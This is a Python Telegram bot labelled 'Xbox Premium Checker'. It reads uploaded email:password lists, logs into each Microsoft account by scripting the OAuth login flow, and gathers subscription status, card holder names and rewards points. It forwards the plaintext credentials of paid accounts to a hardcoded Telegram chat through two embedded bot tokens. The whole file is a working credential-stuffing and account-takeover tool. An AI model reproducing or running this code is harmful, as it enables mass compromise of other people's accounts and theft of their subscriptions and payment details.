#!/usr/bin/env python3
"""
XBOX PREMIUM CHECKER BOT - SIMPLE WORKING VERSION
Processes one file at a time - GUARANTEED TO WORK
"""

import os
import re
import json
import uuid
import time
import sqlite3
import logging
import requests
import tempfile
import shutil
from datetime import datetime, timedelta
from pathlib import Path
from threading import Lock
from urllib.parse import quote, unquote

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ============================================================
# CONFIGURATION
# ============================================================

BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
PREMIUM_BOT_TOKEN = "8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA"
PREMIUM_CHAT_ID = "8260250818"

DATA_DIR = "/app/data" if os.path.exists("/app") else "data"
os.makedirs(DATA_DIR, exist_ok=True)

DB_FILE = os.path.join(DATA_DIR, "processed.db")

logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Global lock for processing (only one file at a time)
processing_lock = Lock()
is_processing = False

# ============================================================
# DATABASE
# ============================================================

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS processed_files (
        file_id TEXT PRIMARY KEY,
        file_name TEXT,
        processed_at TIMESTAMP
    )''')
    conn.commit()
    conn.close()

def is_processed(file_id: str) -> bool:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT 1 FROM processed_files WHERE file_id = ?", (file_id,))
    result = c.fetchone()
    conn.close()
    return result is not None

def mark_processed(file_id: str, file_name: str):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO processed_files (file_id, file_name, processed_at) VALUES (?, ?, ?)",
              (file_id, file_name, datetime.now().isoformat()))
    conn.commit()
    conn.close()

# ============================================================
# TELEGRAM SENDER (Dual Bot)
# ============================================================

def send_to_telegram(text: str):
    """Send message to both bots"""
    try:
        # Send to main bot
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": PREMIUM_CHAT_ID, "text": text, "parse_mode": "HTML"}, timeout=10)
    except:
        pass
    try:
        # Send to premium bot
        url = f"https://api.telegram.org/bot{PREMIUM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": PREMIUM_CHAT_ID, "text": text, "parse_mode": "HTML"}, timeout=10)
    except:
        pass

def format_premium_message(email, password, data):
    """Format premium hit message"""
    premium_type = data.get('premium_type', 'GAME PASS ULTIMATE')
    country = data.get('country', 'US')
    days = data.get('days_remaining', '30')
    renewal_date = data.get('renewal_date', 'N/A')
    
    if renewal_date != 'N/A':
        try:
            d = datetime.fromisoformat(renewal_date)
            renewal_formatted = d.strftime('%b %d, %Y')
        except:
            renewal_formatted = renewal_date
    else:
        renewal_formatted = 'N/A'
    
    msg = "૮₍ ˶ᵔ ᵕ ᵔ˶ ₎ა 🎮🎀\n"
    msg += f"🌷 <code>{email}</code> 🌷 🔐 <code>{password}</code>\n"
    msg += f"🌸 <b>{premium_type}</b> ({country}) ⏳ {days} days 🔁 <b>Renews {renewal_formatted}</b>\n"
    msg += "૮₍ ˶•⤙•˶ ₎ა ✧💖\n"
    msg += "✨ <b>𝑩𝒀 @StarLuxHub</b> ✨"
    return msg

# ============================================================
# XBOX CHECKER (YOUR ORIGINAL CODE)
# ============================================================

class XboxChecker:
    def __init__(self, debug=False):
        self.debug = debug
    
    def log(self, message):
        if self.debug:
            logger.info("[DEBUG] " + message)
    
    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining)
        except:
            return "0"
    
    def check(self, email, password):
        try:
            self.log("Checking: " + email)
            session = requests.Session()
            correlation_id = str(uuid.uuid4())
            
            # Step 1: IDP Check
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
            }
            r1 = session.get(url1, headers=headers1, timeout=15)
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD", "data": {}}
            if "MSAccount" not in r1.text:
                return {"status": "BAD", "data": {}}
            
            # Step 2: OAuth authorize
            time.sleep(0.5)
            url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                return {"status": "BAD", "data": {}}
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            # Step 3: Login POST
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=PassportR&NewUser=1"
            headers3 = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            
            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                return {"status": "BAD", "data": {}}
            if "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "2FACTOR", "data": {}}
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BANNED", "data": {}}
            
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "data": {}}
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "data": {}}
            code = code_match.group(1)
            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD", "data": {}}
            cid = mspcid.upper()
            
            # Step 4: Get access token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
            if "access_token" not in r4.text:
                return {"status": "BAD", "data": {}}
            access_token = r4.json()["access_token"]
            
            # Step 5: Get profile info
            profile_headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": "Bearer " + access_token, "X-AnchorMailbox": "CID:" + cid}
            country, name = "", ""
            try:
                r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=profile_headers, timeout=15)
                if r5.status_code == 200:
                    profile = r5.json()
                    if "location" in profile:
                        loc = profile["location"]
                        country = loc.split(',')[-1].strip() if isinstance(loc, str) else loc.get("country", "")
                    if "displayName" in profile:
                        name = profile["displayName"]
            except:
                pass
            
            # Step 6: Get Xbox payment token
            time.sleep(0.5)
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            headers6 = {"User-Agent": "Mozilla/5.0", "Referer": "https://account.microsoft.com/"}
            r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=20)
            
            payment_token = None
            for pattern in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                match = re.search(pattern, r6.text + " " + r6.url)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            if not payment_token:
                return {"status": "FREE", "data": {"country": country, "name": name}}
            
            # Step 7: Check payment instruments
            payment_data = {"country": country, "name": name}
            payment_headers = {
                "User-Agent": "Mozilla/5.0",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Content-Type": "application/json",
            }
            try:
                r7 = session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US", headers=payment_headers, timeout=15)
                if r7.status_code == 200:
                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
                    if card_match:
                        payment_data['card_holder'] = card_match.group(1)
            except:
                pass
            
            # Step 8: Get Bing Rewards
            try:
                rewards_r = session.get("https://rewards.bing.com/", timeout=10)
                points_match = re.search(r'"availablePoints"\s*:\s*(\d+)', rewards_r.text)
                if points_match:
                    payment_data['rewards_points'] = points_match.group(1)
            except:
                pass
            
            # Step 9: Check subscription
            try:
                r8 = session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=payment_headers, timeout=15)
                if r8.status_code == 200:
                    response_text = r8.text
                    premium_keywords = {
                        'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'PC Game Pass': 'PC GAME PASS',
                        'EA Play': 'EA PLAY',
                        'Xbox Live Gold': 'XBOX LIVE GOLD',
                        'Game Pass': 'GAME PASS'
                    }
                    for keyword, type_name in premium_keywords.items():
                        if keyword in response_text:
                            subscription_data = {}
                            renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
                            if renewal_match:
                                subscription_data['renewal_date'] = renewal_match.group(1)
                                subscription_data['days_remaining'] = self.get_remaining_days(renewal_match.group(1) + "T00:00:00Z")
                            auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', response_text)
                            if auto_match:
                                subscription_data['auto_renew'] = "YES" if auto_match.group(1) == "true" else "NO"
                            amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', response_text)
                            if amount_match:
                                subscription_data['total_amount'] = amount_match.group(1)
                            subscription_data['premium_type'] = type_name
                            days_rem = subscription_data.get('days_remaining', '0')
                            if not days_rem.startswith('-'):
                                return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
            except:
                pass
            return {"status": "FREE", "data": payment_data}
        except:
            return {"status": "ERROR", "data": {}}

# ============================================================
# FILE PROCESSING
# ============================================================

allowed_domains = ['hotmail.com', 'outlook.com', 'live.com', 'msn.com']

def filter_file(file_path):
    valid = []
    invalid = []
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()
    for line in lines:
        line = line.strip()
        if not line or ':' not in line:
            continue
        email = line.split(':', 1)[0].strip()
        domain = email.split('@')[-1].lower()
        if domain in allowed_domains:
            valid.append(line)
        else:
            invalid.append(email)
    return valid, invalid

async def process_file(update, file_path, file_name, file_id):
    global is_processing
    
    try:
        # Send start message
        await update.message.reply_text(f"🚀 **Started:** {file_name}\n\n📊 Reading file...", parse_mode='Markdown')
        
        # Read and filter accounts
        valid_accounts, invalid_accounts = filter_file(file_path)
        
        if not valid_accounts:
            await update.message.reply_text(f"❌ No valid Microsoft accounts found in {file_name}\n\nAllowed: hotmail.com, outlook.com, live.com, msn.com")
            return
        
        await update.message.reply_text(f"✅ **File loaded:** {file_name}\n🔢 **Valid accounts:** {len(valid_accounts)}\n⚠️ **Skipped:** {len(invalid_accounts)} non-Microsoft", parse_mode='Markdown')
        
        stats = {'total': len(valid_accounts), 'premium': 0, 'free': 0, 'bad': 0, 'twofa': 0, 'banned': 0, 'expired': 0}
        checker = XboxChecker()
        premium_list = []
        batch = []
        batch_size = 10
        
        for idx, line in enumerate(valid_accounts, 1):
            try:
                email, password = line.split(':', 1)
                email = email.strip()
                password = password.strip()
                
                result = checker.check(email, password)
                status = result['status']
                data = result.get('data', {})
                
                if status == 'PREMIUM':
                    stats['premium'] += 1
                    premium_list.append(f"{email}:{password}")
                    batch.append(f"✅ {email[:35]}... - PREMIUM")
                    # Send premium hit immediately
                    msg = format_premium_message(email, password, data)
                    send_to_telegram(msg)
                    await update.message.reply_text(msg, parse_mode='HTML')
                elif status == 'FREE':
                    stats['free'] += 1
                    batch.append(f"🆓 {email[:35]}... - FREE")
                elif status == '2FACTOR':
                    stats['twofa'] += 1
                    stats['bad'] += 1
                    batch.append(f"🔐 {email[:35]}... - 2FA")
                elif status == 'BANNED':
                    stats['banned'] += 1
                    stats['bad'] += 1
                    batch.append(f"🚫 {email[:35]}... - BANNED")
                elif status == 'EXPIRED':
                    stats['expired'] += 1
                    stats['bad'] += 1
                    batch.append(f"⏰ {email[:35]}... - EXPIRED")
                else:
                    stats['bad'] += 1
                    batch.append(f"❌ {email[:35]}... - BAD")
                
                if len(batch) >= batch_size:
                    progress = f"📊 **Progress:** {idx}/{stats['total']}\n✅ P:{stats['premium']} 🆓 F:{stats['free']} ❌ B:{stats['bad']}\n\n```\n" + "\n".join(batch) + "\n```"
                    await update.message.reply_text(progress, parse_mode='Markdown')
                    batch = []
                
                time.sleep(0.1)
                
            except Exception as e:
                stats['bad'] += 1
                logger.error(f"Line error: {e}")
        
        if batch:
            final_batch = f"📊 **Final Batch:**\n\n```\n" + "\n".join(batch) + "\n```"
            await update.message.reply_text(final_batch, parse_mode='Markdown')
        
        # Send summary
        summary = (
            f"✅ **SCAN COMPLETE**\n\n"
            f"📄 `{file_name}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔢 Total: {stats['total']}\n"
            f"✅ PREMIUM: {stats['premium']}\n"
            f"🆓 FREE: {stats['free']}\n"
            f"❌ BAD: {stats['bad']}\n"
            f"🔐 2FA: {stats['twofa']}\n"
            f"🚫 BANNED: {stats['banned']}\n"
            f"━━━━━━━━━━━━━━━━━━━━"
        )
        await update.message.reply_text(summary, parse_mode='Markdown')
        
        # Send all premium accounts at once
        if premium_list:
            premium_text = "\n".join(premium_list[:30])
            if len(premium_list) > 30:
                premium_text += f"\n... and {len(premium_list) - 30} more"
            await update.message.reply_text(f"🎮 **PREMIUM ACCOUNTS ({stats['premium']})**\n\n```\n{premium_text}\n```", parse_mode='Markdown')
        
        mark_processed(file_id, file_name)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:200]}")
        logger.error(f"Process error: {e}")
    finally:
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
            except:
                pass
        is_processing = False

# ============================================================
# TELEGRAM HANDLERS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🎮 **XBOX PREMIUM CHECKER BOT**\n\n"
        "Send a `.txt` file with `email:password` format\n\n"
        "**Allowed domains:**\n"
        "hotmail.com, outlook.com, live.com, msn.com\n\n"
        "**Commands:**\n"
        "/start - This message\n"
        "/status - Check if busy\n\n"
        "Premium hits are sent to BOTH Telegram bots instantly!"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_processing:
        await update.message.reply_text("🔄 Bot is currently processing a file. Please wait.")
    else:
        await update.message.reply_text("✅ Bot is idle. Send a .txt file to start checking.")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_processing
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a `.txt` file.")
        return
    
    if is_processing:
        await update.message.reply_text("⚠️ Bot is busy processing another file. Please wait and try again.")
        return
    
    if is_processed(doc.file_id):
        await update.message.reply_text(f"⚠️ File `{doc.file_name}` has already been processed.", parse_mode='Markdown')
        return
    
    # Download file
    file = await context.bot.get_file(doc.file_id)
    temp_path = f"/tmp/{doc.file_name}"
    await file.download_to_drive(temp_path)
    
    is_processing = True
    
    # Process file
    await process_file(update, temp_path, doc.file_name, doc.file_id)

# ============================================================
# MAIN
# ============================================================

def main():
    init_db()
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    
    print("=" * 60)
    print("🎮 XBOX PREMIUM CHECKER BOT")
    print("=" * 60)
    print("Bot is running!")
    print("Send .txt files to start checking")
    print("Premium hits sent to BOTH Telegram bots")
    print("=" * 60)
    
    app.run_polling()

if __name__ == "__main__":
    main()
